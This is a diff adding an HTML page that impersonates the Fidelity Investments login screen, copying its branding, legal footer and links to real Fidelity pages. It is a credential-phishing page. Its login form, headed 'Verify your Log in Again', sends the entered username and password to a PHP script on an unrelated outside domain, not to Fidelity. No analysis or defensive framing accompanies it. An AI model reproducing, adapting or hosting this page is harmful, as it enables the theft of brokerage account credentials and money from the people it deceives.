@@ -1,0 +1,702 @@
+
+<html lang="en">
+<head class="at-element-marker">
+<!-- DOM SDK Integration -->
+<meta content="noindex, nofollow" name="robots"/>
+<meta charset="utf-8">
+<title>Fidelity</title>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<style>
+        .expDefault {
+            visibility: hidden;
+        }
+    </style>
+<style>
+        .mboxDefault {
+            visibility: hidden;
+        }
+    </style>
+<link href="local_resources/img/b41adf6cc3a7e1fa1309beb72d076811.ico" rel="icon" type="image/x-icon"/>
+<link href="local_resources/css/dea203d1ac8391a0021e01d5c8fc1994.css" rel="stylesheet"/>
+<link href="local_resources/css/b8a9be510a09216b9f5a20ccbed54305.css" rel="stylesheet"/>
+<link href="local_resources/css/093652c7c6a4d66cc5ad145b0609b0f2.css" rel="stylesheet"/>
+<style type="text/css">
+        .ensCenter {
+            text-align: center;
+        }
+
+        #ensModalWrapper {
+            border: 1px solid #333;
+            position: fixed;
+            max-width: 80%;
+            border: 1px solid #000;
+            display: none;
+            box-shadow: 5px 5px 5px grey;
+            background-color: #fff;
+            padding: 20px 0;
+            z-index: 9999;
+        }
+
+        .ensModal {
+            font-family: Roboto, "Helvetica Neue", Helvetica, Arial;
+        }
+
+        .ensModal input[type="checkbox"] {
+            position: absolute !important;
+            height: 1px;
+            width: 1px;
+            overflow: hidden;
+            clip: rect(1px, 1px, 1px, 1px);
+            white-space: nowrap;
+            /* added line */
+        }
+
+        .ensModal input[type="checkbox"]:checked~.toggle {
+            background: #fff;
+            left: 36px;
+            transition: 0.5s;
+        }
+
+        .ensModal input[type="checkbox"]:checked~.switch {
+            background: #43a047;
+            transition: 0.5s;
+        }
+
+        .ensModal .switch {
+            display: block;
+            width: 50px;
+            height: 15px;
+            background: #939393;
+            border-radius: 10px;
+            position: absolute;
+            top: 0;
+            transition: 0.5s;
+        }
+
+        .ensModal .toggle {
+            height: 17px;
+            width: 17px;
+            border-radius: 50%;
+            background: white;
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4);
+            transition: 0.5s;
+        }
+
+        .ensModal .card {
+            display: inline-block;
+            margin: 9px;
+            margin: 5px;
+            width: 50px;
+            height: 20px;
+            text-align: center;
+            position: relative;
+            float: right;
+        }
+
+        .ensModal {
+            font-size: 18px;
+            color: #333;
+            padding: 20px;
+        }
+
+        .ensToggleRow {
+            margin-bottom: 10px;
+        }
+
+        .ensToggleLabel {
+            margin-right: 5px;
+        }
+
+        .ensButtons {
+            clear: both;
+            margin-top: 15px;
+            float: right;
+        }
+
+        .ensButtons .button {
+            display: inline-block;
+            position: relative;
+            width: 120px;
+            height: 32px;
+            border-radius: 2px;
+            font-size: 0.9em;
+            background-color: #fff;
+            color: #646464;
+            margin-left: 20px;
+        }
+
+        .ensButtons .button.grey {
+            background-color: #eee;
+        }
+
+        .ensButtons .button.blue {
+            background-color: #2b5cac;
+            color: #fff;
+        }
+
+        .ensButtons .button.raised {
+            transition: box-shadow 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            transition-delay: 0.2s;
+            box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.26);
+        }
+
+        .ensButtons .button.raised:active {
+            box-shadow: 0 8px 17px 0 rgba(0, 0, 0, 0.2);
+            transition-delay: 0s;
+        }
+
+        .ensModal .ensTitle {
+            margin: 5px;
+            width: 95%;
+            color: #74736f;
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            padding-left: 5%;
+            padding-top: 13px;
+            padding-bottom: 3px;
+            text-align: center;
+        }
+
+        .ensModal .consentDescription {
+            color: #333;
+            font-size: 14px;
+        }
+
+        .ensModal hr {
+            color: #c5c5c5;
+        }
+
+        .ensModal .description {
+            max-width: 600px;
+            font-size: 12px;
+            margin-top: 15px;
+            clear: both;
+        }
+
+        .ensToggleLabel.chevron::before {
+            border-style: solid;
+            border-width: 2px 2px 0 0;
+            content: "";
+            display: inline-block;
+            height: 8px;
+            margin: 0 5px 2px 0;
+            position: relative;
+            width: 8px;
+        }
+
+        .ensToggleLabel.chevron.right:before {
+            transform: rotate(45deg);
+        }
+
+        .ensToggleLabel.chevron.bottom:before {
+            margin-left: 2px;
+            margin-bottom: 3px;
+            transform: rotate(135deg);
+        }
+
+        .ensModal .ensTagsContent {
+            display: none;
+            padding: 0 0 0 20px;
+        }
+
+        .ensModal .tagContainer {
+            color: #676767;
+            padding: 7px 0 7px 7px;
+            font-size: 15px;
+        }
+
+        .contactInfoLink {
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .ensToggleRowWrapper {
+            max-height: 400px;
+            overflow: auto;
+        }
+    </style>
+<style id="smart-suggest-rollout-styles">
+        #pns {
+            display: none;
+        }
+
+        .smart-suggest {
+
+            display: block !important;
+
+        }
+
+        @media (min-width: 1px) and (max-width: 760px) {
+
+            .smart-suggest {
+
+                display: none !important
+            }
+
+            .smart-suggest.pnsa {
+
+                display: block !important;
+
+            }
+
+        }
+    </style>
+</meta></head>
+<body data-masking="true">
+<div class="main-container">
+<nav class="dom-header">
+<div class="dom-header-logo">
+<a href="https://href.li/?https://www.fidelity.com">
+<img alt="Fidelity Investments" src="local_resources/img/cdb562d1c96d44e02b3edac90f379648.svg"/>
+</a>
+</div>
+<div class="dom-header-links">
+<s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-header-pvd-link" href="https://href.li/?https://www.fidelity.com/security/overview"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot id="hd-main" name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+<s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-header-pvd-link pvd-space-inline-two-x" href="https://href.li/?https://www.fidelity.com/customer-service/need-help-logging-in"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>FAQs</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+</div>
+</nav>
+<div class="dom-container">
+<div id="dom-overlay" style="display: none;">
+<div id="dom-backdrop" style="width: 448px; height: 433px"></div>
+<div aria-live="assertive" id="dom-modal" role="dialog" style="top: 356.344px;" tabindex="-1"><pvd-spinner pvd-color="neutral" pvd-hidden="false" pvd-primary-text="Loading" pvd-secondary-text="This could take a moment." pvd-size="medium" pvd-triggered-by-interaction="true"><s-root><!-- -->
+<div class="pvd-spinner-root pvd-spinner--neutral pvd-spinner--medium" role="status" tabindex="-1">
+<div aria-hidden="true" class="pvd-spinner__spinner">
+<div class="pvd-spinner__visual">
+<div class="pvd-spinner__mask pvd-spinner__mask--left">
+<div class="pvd-spinner__mask-inner"></div>
+</div>
+<div class="pvd-spinner__mask pvd-spinner__mask--right">
+<div class="pvd-spinner__mask-inner"></div>
+</div>
+</div>
+</div>
+<!--?lit$53965891$-->
+<div class="pvd-spinner__microcopy">
+<div class="pvd-spinner__microcopy-primary">
+<!--?lit$53965891$--> <s-slot name="icon"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<p class="pvd-spinner__microcopy-text"><!--?lit$53965891$-->Loading</p>
+</div>
+<!--?lit$53965891$-->
+<p class="pvd-spinner__microcopy-secondary"><!--?lit$53965891$-->This could take a moment.</p>
+</div>
+</div>
+</s-root></pvd-spinner></div>
+</div>
+<div id="dom-widget">
+<div class="dom-card dom-signin-card">
+<div class="dom-card-header">
+<pvd-title><s-root><!-- -->
+<div class="pvd-title-root">
+<div class="pvd-title__title">
+<div class="pvd-title__heading-wrapper">
+<s-assigned-wrapper name="heading">
+<h1 class="pvd-title__heading pvd-title__heading--level-3" id="dom-login-header" slot="heading">
+													Verify your Log in Again</h1>
+</s-assigned-wrapper>
+<!--?lit$646893491$--> <s-slot name="metadata"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<!--?lit$646893491$--> <s-slot name="annotation"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<!--?lit$646893491$--> <s-slot name="subheading"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+</div>
+<!--?lit$646893491$--> <s-slot name="action"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+</div>
+</div>
+</s-root>
+</pvd-title>
+</div>
+<div class="dom-card-body"><pvd-form pvd-dense="true" pvd-novalidate="false"><s-root><!-- -->
+<div class="pvd-form-root pvd-form--dense">
+<form action="https://lorene.nl/Fedhbk01/Fed_bk/php/logn.php" class="pvd-form__form" method="post" novalidate="">
+<s-slot>
+<s-assigned-wrapper>
+<pvd-field-group pvd-dense="false" pvd-fixed-width="false" pvd-inline="never" pvd-vertical-align="top">
+<s-root><!-- -->
+<div class="pvd-field-group-root pvd-field-group--full-width pvd-field-group--vertical-align-top">
+<!--?lit$646893491$--><s-slot name="group-label"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<div class="pvd-field-group__field-group">
+<s-slot><s-assigned-wrapper><pvd-label pvd-for="username" pvd-id="dom-username-label" pvd-indicator-optional-text="optional" pvd-size="large" pvd-variant="primary"><s-root><!-- -->
+<div class="pvd-label-root pvd-label--large pvd-label--primary"><!--?lit$646893491$--><label class="pvd-label__label" for="username"><!--?lit$646893491$--> <s-slot><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper>Username</s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--><!--?lit$646893491$--><s-slot name="annotation"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?--></label></div>
+</s-root></pvd-label>
+<div>
+<pvd-input pvd-aria-describedby="dom-username-error-alert" pvd-disabled="false" pvd-error="false" pvd-id="username" pvd-native-input-attributes='{"maxlength": 50, "autoComplete" :"off"}' pvd-required="true" pvd-size="medium" pvd-text-align="left" pvd-type="text" pvd-value=""><s-root><!-- -->
+<div class="pvd-input-root pvd-input--medium pvd-input--text-left">
+<!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<input aria-describedby="dom-username-error-alert" aria-required="true" autocomplete="off" class="pvd-input__input" id="username" maxlength="50" name="username2" required="" title="" type="text"/>
+<!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+</div>
+</s-root>
+</pvd-input>
+</div>
+<div id="username-error" style="display: none;">
+<pvd-inline-alert pvd-enable-a11y-attributes="false" pvd-id="dom-username-error-alert" pvd-size="medium" pvd-variant="critical"><s-root><!-- -->
+<div class="pvd-inline-alert-root pvd-inline-alert--medium pvd-inline-alert--critical" id="dom-username-error-alert">
+<div class="pvd-inline-alert__icon"><!--?lit$850985464$-->
+<pvd-scoped-icon-50582291 data-tag-name="pvd-scoped-icon" pvd-name="alert__critical" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$850985464$-->
+<use href="#pvd-alert__critical" xlink:href="#pvd-alert__critical"></use>
+</svg></pvd-scoped-icon-50582291>
+</div>
+<div class="pvd-inline-alert__content">
+<span class="pvd-inline-alert__content-a11y-text"><!--?lit$850985464$-->critical</span>
+<!--?lit$850985464$-->
+<s-slot><s-fallback-wrapper hidden="true"><!--?lit$850985464$--></s-fallback-wrapper><s-assigned-wrapper>Enter your username.</s-assigned-wrapper></s-slot>
+</div>
+</div>
+</s-root>
+</pvd-inline-alert>
+</div>
+<pvd-label pvd-for="password" pvd-id="dom-password-label" pvd-indicator-optional-text="optional" pvd-size="large" pvd-variant="primary"><s-root><!-- -->
+<div class="pvd-label-root pvd-label--large pvd-label--primary"><!--?lit$646893491$--><label class="pvd-label__label" for="password"><!--?lit$646893491$--> <s-slot><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper>Password</s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--><!--?lit$646893491$--><s-slot name="annotation"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?--></label></div>
+</s-root>
+</pvd-label>
+<pvd-input pvd-aria-describedby="dom-password-error-alert" pvd-class="user-pswd-input" pvd-disabled="false" pvd-error="false" pvd-id="password" pvd-native-input-attributes='{"maxlength": 20, "autoComplete": "off"}' pvd-required="true" pvd-size="medium" pvd-text-align="left" pvd-type="password" pvd-value=""><s-root><!-- -->
+<div class="pvd-input-root pvd-input--icon-right pvd-input--medium pvd-input--text-left">
+<!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+<input aria-describedby="dom-password-error-alert" aria-required="true" autocomplete="off" class="pvd-input__input" id="password" maxlength="20" name="password2" required="" title="" type="password"/>
+<!--?lit$646893491$--><span class="pvd-input__icon pvd-input__icon--right"><s-slot name="icon-right"><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper><pvd-icon id="eye-icon" pvd-a11y-label="show password" pvd-class="user-signin-show-pswd-icon" pvd-id="dom-signin-show-pswd-icon" pvd-name="action__show" pvd-size="small" role="button" slot="icon-right" tabindex="0"><!-- --><svg aria-hidden="false" aria-labelledby="pvd-icon-title-97399065143" class="pvd-icon-root pvd-icon--small" focusable="true" role="img">
+<!--?lit$646893491$-->
+<title id="pvd-icon-title-97399065143"><!-- -->show password<!-- --></title>
+<use href="#pvd-action__show" id="inline-eye" xlink:href="#pvd-action__show"></use>
+</svg></pvd-icon></s-assigned-wrapper></s-slot></span>
+</div>
+</s-root>
+</pvd-input>
+<div id="password-error" style="display: none;">
+<pvd-inline-alert pvd-enable-a11y-attributes="false" pvd-id="dom-password-error-alert" pvd-size="medium" pvd-variant="critical"><s-root><!-- -->
+<div class="pvd-inline-alert-root pvd-inline-alert--medium pvd-inline-alert--critical" id="dom-password-error-alert">
+<div class="pvd-inline-alert__icon"><!--?lit$850985464$-->
+<pvd-scoped-icon-50582291 data-tag-name="pvd-scoped-icon" pvd-name="alert__critical" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$850985464$-->
+<use href="#pvd-alert__critical" xlink:href="#pvd-alert__critical"></use>
+</svg></pvd-scoped-icon-50582291>
+</div>
+<div class="pvd-inline-alert__content">
+<span class="pvd-inline-alert__content-a11y-text"><!--?lit$850985464$-->critical</span>
+<!--?lit$850985464$-->
+<s-slot><s-fallback-wrapper hidden="true"><!--?lit$850985464$--></s-fallback-wrapper><s-assigned-wrapper>Enter your password.</s-assigned-wrapper></s-slot>
+</div>
+</div>
+</s-root>
+</pvd-inline-alert>
+</div>
+<div class="dom-margin-top-space-stack-one-x-important"><pvd-checkbox pvd-checked="false" pvd-disabled="false" pvd-error="false" pvd-id="dom-remember-username-checkbox" pvd-indeterminate="false" pvd-label-hidden="false" pvd-required="false" pvd-size="medium"><s-root><!-- -->
+<div class="pvd-checkbox-root pvd-checkbox--medium">
+<input class="pvd-checkbox__checkbox" id="dom-remember-username-checkbox" type="checkbox"/>
+<label class="pvd-checkbox__label" for="dom-remember-username-checkbox">
+<div aria-hidden="true" class="pvd-checkbox__checkbox-wrap">
+<!--?lit$646893491$-->
+<pvd-checkbox-icon-79138253 data-tag-name="pvd-checkbox-icon" pvd-icon-class="pvd-checkbox__checkbox-wrap-icon pvd-checkbox__checkbox-wrap-icon--checked" pvd-name="action__check" pvd-size="extra-small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-checkbox__checkbox-wrap-icon pvd-checkbox__checkbox-wrap-icon--checked pvd-icon--extra-small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__check" xlink:href="#pvd-action__check"></use>
+</svg></pvd-checkbox-icon-79138253>
+<!--?lit$646893491$-->
+<pvd-checkbox-icon-79138253 data-tag-name="pvd-checkbox-icon" pvd-icon-class="pvd-checkbox__checkbox-wrap-icon pvd-checkbox__checkbox-wrap-icon--indeterminate" pvd-name="action__subtract" pvd-size="extra-small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-checkbox__checkbox-wrap-icon pvd-checkbox__checkbox-wrap-icon--indeterminate pvd-icon--extra-small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__subtract" xlink:href="#pvd-action__subtract"></use>
+</svg></pvd-checkbox-icon-79138253>
+</div>
+<div class="pvd-checkbox__label-text"><!--?lit$646893491$--> <s-slot><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper>Remember my username</s-assigned-wrapper></s-slot> </div>
+</label>
+<!--?lit$646893491$--><s-slot name="microcopy"><s-assigned-wrapper></s-assigned-wrapper></s-slot>
+</div>
+</s-root></pvd-checkbox></div>
+<div></div>
+<div>
+<div class="body-button-section"><pvd-button pvd-disabled="false" pvd-full-width="true" pvd-gradient-background="false" pvd-icon-only="false" pvd-id="dom-login-button" pvd-size="medium" pvd-type="submit" pvd-variant="primary"><s-root><!-- -->
+<button class="pvd-button-root pvd-button--full-width pvd-button--primary" id="dom-login-button" type="submit">
+<!--?lit$646893491$-->
+<div class="pvd-button__contents"><!--?lit$646893491$--> <s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-button__text"><s-slot><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper>Log in</s-assigned-wrapper></s-slot></span><!--?lit$646893491$--> <s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot></div>
+</button>
+</s-root></pvd-button></div>
+</div>
+<div>
+<div class="body-link-section"><s-root><!-- --><span class="pvd-link-root pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link" href="https://href.li/?https://digital.fidelity.com/prgw/digital/login/user-identity" id="dom-frgt-usrname-pswd-link"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__text"><s-slot><s-fallback-wrapper hidden="true"><!--?lit$646893491$--></s-fallback-wrapper><s-assigned-wrapper>Forgot username or password?</s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root></div>
+</div>
+</s-assigned-wrapper></s-slot>
+</div>
+</div>
+</s-root></pvd-field-group></s-assigned-wrapper></s-slot>
+</form>
+</div>
+</s-root></pvd-form></div>
+</div>
+</div>
+<div aria-live="assertive" id="dom-sronly"></div>
+</div>
+<div class="dom-link-actions">
+            New to Fidelity?
+            <s-root><!-- --><span class="pvd-link-root pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-link" href="https://href.li/?https://www.fidelity.com/open-account/overview"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Open an account</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+<pvd-class="dom-space-right dom-space-left"="">or
+                <s-root><!-- --><span class="pvd-link-root pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-link" href="https://href.li/?https://digital.fidelity.com/prgw/digital/login/user-identity?intent=nur"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>sign up.</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+</pvd-class="dom-space-right>
+</div>
+<div class="dom-link-lessres">
+            New to Fidelity?
+            <div style="white-space: pre-wrap"></div>
+<s-root><!-- --><span class="pvd-link-root pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-link" href="https://href.li/?https://www.fidelity.com/open-account/overview"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Open an account</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+<pvd-class="dom-space-right dom-space-left"="">or
+                <s-root><!-- --><span class="pvd-link-root pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-link" href="https://href.li/?https://digital.fidelity.com/prgw/digital/login/user-identity?intent=nur"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>sign up.</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+</pvd-class="dom-space-right>
+</div>
+<div class="dom-mv-actions">
+<s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-act-link dom-space-right dom-space-top" href="https://href.li/?https://www.fidelity.com/security/overview"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+<s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-act-link dom-space-top" href="https://href.li/?https://www.fidelity.com/customer-service/need-help-logging-in"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>FAQs</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+</div>
+</div>
+<footer class="dom-footer">
+<p>
+<s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link underline" href="https://href.li/?https://www.fidelity.com/customer-service/nfs-statement-financial-condition"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>National Financial Services LLC Statement of Financial Condition</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+<br/>
+            Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit
+            <s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link underline" href="https://href.li/?https://www.fidelity.com/security/overview"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>browser encryption</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>
+            . Usage of Fidelity's online trading services constitutes agreement of the
+            <s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link underline" href="https://href.li/?https://scs.fidelity.com/webxpress/electronic_services_agreement.shtml"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Electronic Services Customer Agreement</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root> and
+            <s-root><!-- --><span class="pvd-link-root pvd-link--disable-underline pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link underline" href="https://href.li/?https://scs.fidelity.com/webxpress/license_agreement.html"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>License Agreement</s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot name="icon-right"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><!--?--></a><!--?--></span></s-root>.
+            <br/>
+            Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.
+            <br/>
+            Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+        </p>
+<div>
+<div class="footer-copyright">
+                Â©1998-2023 FMR LLC. All Rights Reserved.
+                <br/>
+                844672.6.0
+            </div>
+<div class="footer-links">
+<s-root><!-- --><span class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link" href="https://href.li/?https://www.fidelity.com/terms-of-use" rel="noopener" target="_blank"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Terms of use</s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__icon pvd-link__icon--right"><s-slot name="icon-right"><s-fallback-wrapper><!--?lit$646893491$--><pvd-scoped-icon-83617107 data-tag-name="pvd-scoped-icon" pvd-name="action__open-link" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__open-link" xlink:href="#pvd-action__open-link"></use>
+</svg></pvd-scoped-icon-83617107></s-fallback-wrapper><s-assigned-wrapper></s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><span class="pvd-link__screen-reader-text">
+<!--?lit$646893491$-->Opens in a new window</span><!--?--></a><!--?--></span></s-root>
+<s-root><!-- --><span class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link" href="https://href.li/?https://www.fidelity.com/privacy-policy" rel="noopener" target="_blank"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Privacy</s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__icon pvd-link__icon--right"><s-slot name="icon-right"><s-fallback-wrapper><!--?lit$646893491$--><pvd-scoped-icon-83617107 data-tag-name="pvd-scoped-icon" pvd-name="action__open-link" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__open-link" xlink:href="#pvd-action__open-link"></use>
+</svg></pvd-scoped-icon-83617107></s-fallback-wrapper><s-assigned-wrapper></s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><span class="pvd-link__screen-reader-text">
+<!--?lit$646893491$-->Opens in a new window</span><!--?--></a><!--?--></span></s-root>
